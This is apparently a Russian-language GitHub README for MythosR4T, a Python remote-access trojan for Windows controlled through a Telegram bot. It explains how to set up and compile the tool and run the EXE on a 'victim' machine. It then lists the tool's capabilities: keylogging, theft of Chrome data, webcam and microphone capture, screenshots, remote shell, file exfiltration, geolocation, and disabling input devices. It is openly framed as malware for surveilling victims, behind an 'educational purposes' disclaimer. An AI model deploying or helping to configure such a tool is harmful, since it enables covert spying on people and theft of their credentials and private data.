# MythosR4T.

Это Remote Administration Tool (RAT) для операционных систем Windows, MythosR4T был написан на чистом Python и предназначен для удаленного управления компьютерами.

## Дисклеймер.

Внимание! Автор данного кода не несет ответстветнности за любые последствия от ее прочтения. Все материалы
предоставлены в исключительно образовательных целях!

Для начала что такoe Rat - rat переводится как крыса или Remote Administration Tool (Удалённое Администрирование)

## Установка.

1. Клонируйте репозиторию:

```bash
git clone https://github.com/mython-dev/MythosR4T.git
```

2. Перейдите в директорию проекта:

```bash
cd MythosR4T
```

3. Перейдите в директорию libs:

Для начала работы с ратником откройте файл `config.py` и вставьте свой TOKEN и ID.

```python
TOKEN = "" # GET TOKEN --> tme.to/BotFather
ID = "" # GET ID --> tme.to/my_id_bot
```

4. Перейдите в директорию проекта и запустите `compile.bat`.

5. Когда вы увидите в консоли сообщение, 
```bash 
INFO: Building EXE from EXE-00.toc completed successfully.
Для продолжения нажмите любую клавишу . . .
```
закройте консоль, нажав на любую клавишу. 

5. Перейдите в папку `dist/` и запустите файл `MythosR4T.exe` на целевом устройстве (Жертва).

6. Когда жертва откроет ратника, вы получите ответное сообщение "Жертва подключилась".

## Функции.

<pre>
Commands:

/help - Отправка всех доступных комманд.
/reboot - Перезагрузить клиентский ПК.
/shutdown - Выключить клиентский ПК.
/drivers - Все драйвера ПК.
/kill - Убить системную задачу.
/sysinfo - Основная информация о системе.
/tasklist - Все системные задачи.
/monitors - Получить список мониторов.
/turnoff_mon - Выключить монитор.
/turnon_mon - Включить монитор.
/volumeup - Увеличить громкость до 100%.
/volumedown - Уменьшить громкость до 0%.
/sendmessage - Отправить сообщение с текстом.
/setwallpaper - Изменить обой.
/open_link - Открыть ссылку в браузере.
/pwd - Получить текущий рабочий каталог.
/cd - Изменить каталог.
/dir - Получить все файлы текущего каталога.
/makedir - Создать директорию.
/rmdir - Удалить директорию.
/rmfile - Удалить файл.
/searchfile - Искать файл в системе.
/screenshot- Скриншот.
/chrome - Все данные Хрома.
/webcam_snap - Сделать фото с веб-камеры.
/shell - Cmd.exe
/download - Cкачать файл.
/geolocate - Получить примерное местонахождение жертвы.
/keylogger_start - Запустить Keylogger.
/send_logs_keylogger - Отправить логи кейлоггера.
/keylogger_stop - Остановить Keylogger.
/audio - Запись аудио с пк жертвы.
/disablekeyboard - Отключить клавиатуру.
/enablekeyboard - Включить клавиатуру, Работает багом иногда не включает клавитуру...
/disablemouse - Отключить мышку.
/enablemouse - Включить мышку.
/clipboard - Посмотреть буфер обмена.
/alt_f4 - Закрыть окно.
/runprogramm - Запустить программу.
/voice - Если ты скинешь мне голосовое сообщение я открою его у жертвы
</pre>

## Лицензия.

<pre>
MIT License

Copyright (c) 2023 mython-dev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
</pre>

## Контакты.

- [![Github](https://img.shields.io/badge/Github-mython_dev-green?style=for-the-badge&logo=github)](https://github.com/mython-dev)

- [![Gmail](https://img.shields.io/badge/Gmail-miton0030-green?style=for-the-badge&logo=gmail)](mailto:miton0030@gmail.com)

- [![Instagram](https://img.shields.io/badge/mython_dev--green?style=for-the-badge&logo=instagram)](https://instagram.com/mython_dev)
- [![Instagram](https://img.shields.io/badge/thehackerworld_--green?style=for-the-badge&logo=instagram)](https://instagram.com/thehackerworld_)